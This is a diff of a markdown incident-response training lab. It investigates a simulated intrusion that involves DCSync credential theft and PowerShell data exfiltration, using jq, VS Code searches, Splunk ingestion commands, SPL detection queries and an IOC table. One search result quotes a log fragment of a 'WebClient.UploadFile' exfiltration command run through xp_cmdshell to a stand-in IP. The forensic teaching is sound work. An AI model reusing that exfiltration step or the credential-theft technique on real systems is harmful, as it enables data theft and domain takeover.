+{"time": "2024-11-06T00:48:33Z", "subject": "svc_backup", "object": "DC=lifetechpharma,DC=local"}
+{"time": "2024-11-06T00:48:44Z", "subject": "svc_backup", "object": "CN=krbtgt,CN=Users,DC=..."}
+{"time": "2024-11-06T00:48:51Z", "subject": "svc_backup", "object": "CN=Administrator,CN=..."}
 ```
 
-PowerShell initiating the outbound HTTPS connection at `00:14:14Z` — matches the SQL audit `WebClient.UploadFile` at `00:13:54Z` (20 seconds earlier, which is when the command was issued) and the Palo Alto NGFW flow at `00:14:14Z`. Three independent sources triangulate to the same 20-second window.
+`krbtgt` and `Administrator` DCSync'd — golden ticket capability obtained. Full domain credential rotation required.
+
+**Click `windows-security/SERVER-RD-02-security.jsonl`:**
+
+`Ctrl+F` → `4663` — file access events. `Ctrl+F` → `5156` — network connection event.
+
+```bash
+jq 'select(.EventID == 4663) | .ObjectName' \
+  windows-security/SERVER-RD-02-security.jsonl | jq -s 'length'
+# → 47  (47 formula files accessed)
+
+jq 'select(.EventID == 5156) | {
+  time: .TimeCreated, process: (.Application | split("\\\\") | last),
+  src: .SourceAddress, dst: .DestAddress, dst_port: .DestPort
+}' windows-security/SERVER-RD-02-security.jsonl
+# → PowerShell → 198.51.100.44:443 at 00:14:14Z
+```
+
+Three independent sources — SQL audit (`00:13:54Z` command issued), NGFW flow (`00:14:14Z` bytes transferred), Windows Security EID 5156 (`00:14:14Z` connection initiated) — triangulate to the same 20-second window.
 
 ---
 
-### 13. Correlate Everything in Splunk
+### 13. Cross-File Pivot — VS Code Global Search
 
-If you have a Splunk instance, ingest the evidence files and reproduce the investigation in SIEM context. (For the training lab, import files as custom sourcetypes using the `oneshot` method below.)
+VS Code's `Ctrl+Shift+F` searches across every open file simultaneously. Use it to verify IOC presence across all evidence in seconds — no SIEM needed for these basic pivots.
 
-**Load the evidence into Splunk:**
+**Pivot on the exfil IP:**
+
+`Ctrl+Shift+F` → `198.51.100.44`:
+
+```
+ngfw-flows.csv           line 12: ...10.10.2.15,198.51.100.44,443,...399481224...
+dns-queries.csv          line 10: ...sys-update-cdn.net,A,198.51.100.44...
+sql-audit.jsonl          line 4:  ...WebClient.UploadFile...198.51.100.44/recv...
+SERVER-RD-02-security    line 23: ..."DestAddress":"198.51.100.44"...
+```
+
+Four files, four hits, one IP. The full exfiltration chain is visible in one search.
+
+**Pivot on the compromised account:**
+
+`Ctrl+Shift+F` → `svc_backup`:
+
+```
+DC01-security.jsonl       lines 7-9:   DCSync events
+SERVER-RD-02-security     lines 1-12:  SMB logon + file access + exfil
+sql-audit.jsonl           all 6 lines: full xp_cmdshell chain
+```
+
+**Pivot on the C2 domain:**
+
+`Ctrl+Shift+F` → `telemetry-cdn-services.biz`:
+
+```
+dns-queries.csv           lines 13-22: 9 beacon queries
+vpn/anyconnect.log        lines 34-47: C2 connections during VPN session
+```
+
+The full attack chain — from AiTM phishing through VPN access, formula exfiltration, DCSync, and CFO infection — is navigable via four global searches without opening a SIEM.
+
+---
+
+### 14. Splunk Correlation (SIEM Validation)
+
+Load the evidence into Splunk from the VS Code integrated terminal to validate that the Sigma rules fire on the real evidence:
 
 ```bash
-# Sysmon events
-/opt/splunk/bin/splunk add oneshot \
-  sysmon/WS-CFO-01-sysmon.jsonl \
+/opt/splunk/bin/splunk add oneshot sysmon/WS-CFO-01-sysmon.jsonl \
   -sourcetype sysmon_json -index endpoint -host WS-CFO-01
 
-# Windows Security events — DC01
-/opt/splunk/bin/splunk add oneshot \
-  windows-security/DC01-security.jsonl \
+/opt/splunk/bin/splunk add oneshot windows-security/DC01-security.jsonl \
   -sourcetype wineventlog -index wineventlog -host DC01
 
-# Windows Security events — SERVER-RD-02
-/opt/splunk/bin/splunk add oneshot \
-  windows-security/SERVER-RD-02-security.jsonl \
+/opt/splunk/bin/splunk add oneshot windows-security/SERVER-RD-02-security.jsonl \
   -sourcetype wineventlog -index wineventlog -host SERVER-RD-02
 
-# NGFW flows
-/opt/splunk/bin/splunk add oneshot \
-  palo-alto/ngfw-flows.csv \
+/opt/splunk/bin/splunk add oneshot palo-alto/ngfw-flows.csv \
   -sourcetype pan:traffic -index firewall -host pa-3260
 
-# DNS queries
-/opt/splunk/bin/splunk add oneshot \
-  palo-alto/dns-queries.csv \
+/opt/splunk/bin/splunk add oneshot palo-alto/dns-queries.csv \
   -sourcetype pan:dns -index firewall -host pa-3260
 
-# SQL audit
-/opt/splunk/bin/splunk add oneshot \
-  sql-audit/SERVER-RD-02-sql-audit.jsonl \
+/opt/splunk/bin/splunk add oneshot sql-audit/SERVER-RD-02-sql-audit.jsonl \
   -sourcetype mssql_audit -index database -host SERVER-RD-02
 ```
 
-**Query 1 — scope the C2 IP across all indexes first (triage query):**
+**Query 1 — triage: C2 IPs across all indexes:**
 
 ```spl
 index=* (203.0.113.87 OR 198.51.100.44) earliest=-30d
@@ -1856,100 +1462,54 @@ index=* (203.0.113.87 OR 198.51.100.44) earliest=-30d
 | sort -count
 ```
 
-This tells you which hosts talked to C2 and in which data source you will find the evidence. Run this first — always.
-
-**Query 2 — validate DET-002: DCSync from non-DC:**
+**Query 2 — DCSync from non-DC (DET-002 validation):**
 
 ```spl
 index=wineventlog EventCode=4662
   ObjectType="{19195a5b-6da0-11d0-afd3-00c04fd930c9}"
 | where NOT match(IpAddress, "^10\.10\.1\.(10|11)$")
 | table _time, host, SubjectUserName, IpAddress, ObjectName, Properties
-| sort _time
 ```
 
-If this fires on DC01-security.jsonl, DET-002 is confirmed working against real evidence.
-
-**Query 3 — validate DET-003: service account off-hours auth:**
+**Query 3 — service account off-hours (DET-003 validation):**
 
 ```spl
 index=wineventlog EventCode=4624 LogonType=3
-  TargetUserName=svc_backup earliest=-45d
+  TargetUserName=svc_backup
 | eval hour=strftime(_time, "%H")
 | where hour < 6 OR hour > 22
-| table _time, host, TargetUserName, IpAddress
-| sort _time
+| table _time, host, TargetUserName, IpAddress | sort _time
 ```
 
-**Query 4 — exfiltration scope: how many files were accessed?**
+**Query 4 — exfil scope:**
 
 ```spl
-index=wineventlog EventCode=4663
-  ObjectName="*USPartner2024*"
-| stats count as files_accessed, min(_time) as first, max(_time) as last
-  by SubjectUserName, host
-| eval duration_sec=last-first
-| table SubjectUserName, host, files_accessed, first, last, duration_sec
+index=wineventlog EventCode=4663 ObjectName="*USPartner2024*"
+| stats count as files_accessed, min(_time) as first, max(_time) as last by SubjectUserName, host
 ```
 
-**Query 5 — full 24-day timeline reconstruction across all sources:**
+**Query 5 — full 24-day timeline:**
 
 ```spl
 index=* earliest=2024-10-22 latest=2024-11-16
   (host=WS-IT-LEVI OR host=WS-CFO-01 OR host=SERVER-RD-02 OR host=DC01)
 | eval summary=coalesce(Message, Statement, query, CommandLine, "event")
-| table _time, host, sourcetype, summary
-| sort _time
+| table _time, host, sourcetype, summary | sort _time
 ```
-
-This single query reconstructs the full 24-day attack timeline from all ingested sources — the same events that populate `timeline.md` in Step R2, but queryable and filterable in real time.
 
 ---
 
-### Commit your analysis notes
-
-Before moving to the timeline, save your enrichment output and analysis notes:
+### Commit all analysis artifacts
 
 ```bash
-# Create your IOC enrichment file
-cat > 03-analysis/ioc-enrichment.md << 'EOF'
-# IOC Enrichment — PROJ-2024-001
-# Analyst: [your name]
-# Date: 2024-11-15
-
-## IPs
-
-| IOC | VT Score | ASN | Notes |
-|---|---|---|---|
-| 203.0.113.87 | 12 malicious | Hostwinds LLC (US VPS) | Primary C2 — GET /update beacon |
-| 198.51.100.44 | TBD | GoDaddy.com LLC | Exfil endpoint — 381 MB received |
-| 185.220.101.47 | TBD | Tor exit / ISP | Attacker VPN source (Istanbul) |
-
-## Domains
-
-| IOC | Created | Resolves To | VT | Notes |
-|---|---|---|---|---|
-| telemetry-cdn-services.biz | 2024-10-12 | 203.0.113.87 | 8 malicious | Primary C2 — staged 10d before phishing |
-| sys-update-cdn.net | TBD | 198.51.100.44 | TBD | Secondary C2 / exfil |
-| mfa-lifetechpharma.com | TBD | 185.220.101.47 | TBD | AiTM phishing page |
-| globalcontracts-secure.net | TBD | TBD | TBD | CFO phishing delivery |
-
-## Hashes
-
-| File | SHA256 | VT | PE Timestamp | Notes |
-|---|---|---|---|---|
-| svchost32.exe | 3b4c14a87e5f... | 31 malicious | 2018-04-09 (FORGED) | C2: 203.0.113.87, 198.51.100.44 |
-
-## New IOCs from crt.sh pivot
-- cdn-telemetry-update.biz — co-cert with primary C2 IP — hunt in DNS logs
-- windows-cdn-service.net — co-cert with primary C2 IP — hunt in DNS logs
-EOF
-
-git add 03-analysis/ioc-enrichment.md
-git commit -m "PROJ-2024-001: evidence analysis — VT enrichment, sandbox, binary analysis, DCSync confirmed, exfil 381MB corroborated across 3 sources"
+git add 03-analysis/
+git commit -m "PROJ-2024-001: evidence analysis — VS Code investigation complete; REST Client queries, RBQL, binary hex analysis, DCSync confirmed, exfil 381MB corroborated in 3 sources"
 ```
 
-The timeline in Step R2 is now fully supported. Every event in the table has a source log analyzed in this step, a tool that was run to confirm it, and a cross-reference that allows a third party to verify the finding independently.
+The timeline in Step R2 is now fully supported. Every event in the table has a source log opened in VS Code, a query or search that confirmed it, and a REST Client or terminal command a third party can replay independently.
+
+---
+
 
 ---
 
